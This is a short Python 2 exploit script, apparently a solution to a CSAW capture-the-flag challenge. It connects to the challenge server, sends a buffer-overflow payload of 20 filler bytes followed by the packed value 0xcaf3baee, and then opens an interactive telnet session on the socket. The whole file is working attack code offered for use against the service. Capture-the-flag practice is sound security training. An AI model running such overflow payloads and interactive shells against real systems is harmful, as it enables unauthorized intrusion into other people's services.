import socket
import struct
import telnetlib

HOST = "pwn.chal.csaw.io"
PORT = 9000

def p(x):
    return struct.pack("<L", x)

def init_connection():
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))

def send_payload():
    
    payload = ""
    payload += "A"*20
    payload += p(0xcaf3baee)

    s.send(payload)

init_connection()
print s.recv(2048)
print s.recv(2048)
send_payload()
print s.recv(2048)
t = telnetlib.Telnet()
t.sock = s
t.interact()
